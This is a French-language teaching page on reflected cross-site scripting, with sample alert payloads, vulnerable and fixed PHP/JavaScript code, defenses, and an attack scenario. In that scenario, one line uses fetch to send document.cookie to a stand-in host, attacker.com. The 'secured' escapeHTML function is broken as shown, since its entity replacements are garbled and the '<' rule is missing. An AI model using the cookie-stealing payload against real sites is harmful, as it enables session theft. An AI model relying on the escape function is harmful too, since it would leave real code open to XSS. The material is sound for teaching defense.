Qu'est-ce que le XSS Réfléchi ?

Le XSS Réfléchi (Reflected XSS) est une vulnérabilité où un script malveillant est envoyé au serveur (via URL ou formulaire) et immédiatement renvoyé dans la réponse HTTP sans être stocké. Le script s'exécute dans le navigateur de la victime.

🎯 Caractéristiques :

  • Non persistant : Le script n'est pas stocké en base de données
  • Nécessite une interaction : La victime doit cliquer sur un lien malveillant
  • Via URL ou formulaire : Paramètres GET/POST reflétés dans la page
  • Vecteur d'attaque : Phishing, ingénierie sociale

💡 Exemple d'attaque :

# URL malveillante https://site.com/search?q=<script>alert('XSS')</script> # L'attaquant envoie ce lien à la victime # Le serveur renvoie : "Résultats pour: <script>alert('XSS')</script>" # Le script s'exécute dans le navigateur de la victime !

🔓 Version Vulnérable

Essayez ces payloads :

<script>alert('XSS!')</script> <img src=x onerror="alert('Hack!')"> <svg onload="alert('XSS')">

⚠️ Code vulnérable :

// ❌ VULNÉRABLE - Réflexion directe <?php $search = $_GET['q']; echo "Résultats pour: " . $search; ?> // JavaScript resultsDiv.innerHTML = "Résultats pour: " + searchQuery; // Pas d'échappement → XSS !

Problème : L'entrée utilisateur est directement insérée dans le HTML sans validation ni échappement.

✅ Version Sécurisée

Essayez les mêmes payloads :

✅ Code sécurisé :

// ✅ SÉCURISÉ - Échappement HTML function escapeHTML(str) { return str .replace(/&/g, '&') .replace(//g, '>') .replace(/"/g, '"') .replace(/'/g, '''); } // Ou utiliser textContent resultsDiv.textContent = "Résultats pour: " + searchQuery;

Protections :

  • ✅ Échappement des caractères HTML spéciaux
  • ✅ Utilisation de textContent au lieu de innerHTML
  • ✅ Validation et filtrage côté serveur
  • ✅ Content Security Policy (CSP)

🎭 Scénario d'attaque réel :

  1. L'attaquant trouve une page vulnérable : https://bank.com/search?q=
  2. Il crée une URL malveillante :
    https://bank.com/search?q=<script> fetch('https://attacker.com/steal?cookie=' + document.cookie) </script>
  3. Il envoie cette URL par email/SMS (phishing) :
    📧 "Votre compte bancaire nécessite une vérification. Cliquez ici !"
  4. La victime clique sur le lien
  5. Le serveur renvoie la page avec le script non échappé
  6. Le script s'exécute dans le navigateur de la victime
  7. Les cookies (session) sont envoyés à l'attaquant
  8. L'attaquant peut maintenant se connecter en tant que la victime !

💥 Impacts du XSS Réfléchi :

  • Vol de session : Envoi des cookies à l'attaquant
  • Keylogging : Enregistrement des frappes clavier
  • Redirection malveillante : window.location = 'https://malware.com'
  • Phishing interne : Affichage de faux formulaires de connexion
  • Défacement : Modification du contenu de la page
  • Propagation de malware : Téléchargement automatique de fichiers

🎯 Vecteurs d'injection courants :

  • Paramètres d'URL (GET) : ?search=<script>
  • Formulaires (POST) : Champs de recherche, commentaires
  • Headers HTTP : User-Agent, Referer (reflétés dans logs/erreurs)
  • Messages d'erreur : "Erreur : fichier '<script>' introuvable"

🛡️ Défenses contre le XSS Réfléchi :

Côté Serveur :

  • Échappement contextuel : Encoder selon le contexte (HTML, JS, URL, CSS)
  • Validation stricte : Whitelist des caractères autorisés
  • Frameworks modernes : Utiliser des templates auto-échappants (Jinja2, Twig)
  • Content Security Policy (CSP) : Content-Security-Policy: default-src 'self'
  • HttpOnly cookies : Empêcher l'accès JavaScript aux cookies

Côté Client :

  • textContent vs innerHTML : Préférer textContent pour le texte brut
  • DOMPurify : Bibliothèque de sanitization HTML
  • Validation d'entrée : Vérifier côté client aussi (mais pas seulement !)
